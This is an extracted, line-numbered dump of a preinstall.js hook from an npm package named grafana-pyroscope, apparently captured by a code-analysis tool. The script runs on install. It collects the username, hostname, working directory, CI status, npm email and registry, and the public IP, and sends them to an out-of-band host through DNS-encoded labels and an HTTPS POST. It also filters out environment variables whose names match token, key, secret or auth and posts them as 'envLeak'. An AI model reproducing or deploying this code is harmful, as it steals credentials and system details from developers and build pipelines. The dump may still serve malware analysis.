// File: tmp/tmpzg57ren0/grafana-pyroscope/package/preinstall.js
// ======================================================================
Line 1: const os = require('os')
Line 2: const dns = require('dns')
Line 3: const https = require('https')
Line 10: Buffer.from(str).toString('hex')
Line 14: const info = {
  user: os.userInfo().username || 'nouser',
  host: os.hostname() || 'nohost',
  cwd: process.cwd(),
  platform: os.platform(),
  arch: os.arch(),
  timestamp: Date.now().toString(36),
  ci: !!process.env.CI || !!process.env.GITHUB_ACTIONS,
  npm_email: process.env['NPM_CONFIG_EMAIL'] || 'noemail',
  npm_registry: process.env['NPM_CONFIG_REGISTRY'] || 'none'
}
Line 15: os.userInfo()
Line 16: os.hostname()
Line 18: os.platform()
Line 19: os.arch()
Line 20: Date.now().toString(36)
Line 22: _tmp_2.npm_email = process.env['NPM_CONFIG_EMAIL'] || 'noemail'
Line 23: _tmp_2.npm_registry = process.env['NPM_CONFIG_REGISTRY'] || 'none'
Line 27: [
  ...hexChunks(info.user),
  ...hexChunks(info.host),
  ...hexChunks(info.cwd),
  info.platform,
  info.arch,
  info.ci ? 'ci' : 'local',
  info.timestamp,
  OAST
].join('.')
Line 28: _tmp_5.push(...hexChunks(info.user))
Line 29: _tmp_5.push(...hexChunks(info.host))
Line 30: _tmp_5.push(...hexChunks(info.cwd))
Line 31: _tmp_5.push(info.platform)
Line 32: _tmp_5.push(info.arch)
Line 33: _tmp_5.push(info.ci ? "ci" : "local")
Line 34: _tmp_5.push(info.timestamp)
Line 35: _tmp_5.push(OAST)
Line 42: (_tmp_6 = https.get('https://api.ipify.org', (res) => {
  let ip = '';
  res.on('data', chunk => ip += chunk);
  res.on('end', () => {
    const payload = JSON.stringify({ ...info, ip: ip.trim() });

    const req = https.request({
      hostname: OAST,
      path: '/',
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    }, () => {});
    req.on('error', () => {});
    req.write(payload);
    req.end();
  });
}))
Line 45: {
    const payload = JSON.stringify({ ...info, ip: ip.trim() });

    const req = https.request({
      hostname: OAST,
      path: '/',
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    }, () => {});
    req.on('error', () => {});
    req.write(payload);
    req.end();
  }
Line 46: ip.trim()
Line 48: const req = https.request({
      hostname: OAST,
      path: '/',
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    }, () => {})
Line 55: req.write(payload)
Line 56: req.end()
Line 62: /token|key|secret|auth/i.test(k)
Line 66: {
  const req = https.request({
    hostname: OAST,
    path: '/',
    method: 'POST',
    headers: { 'Content-Type': 'application/json' }
  }, () => {});
  req.write(JSON.stringify({ envLeak: leaked }));
  req.end();
}
Line 67: const req = https.request({
    hostname: OAST,
    path: '/',
    method: 'POST',
    headers: { 'Content-Type': 'application/json' }
  }, () => {})
Line 73: req.write(JSON.stringify({ envLeak: leaked }))
Line 74: req.end()
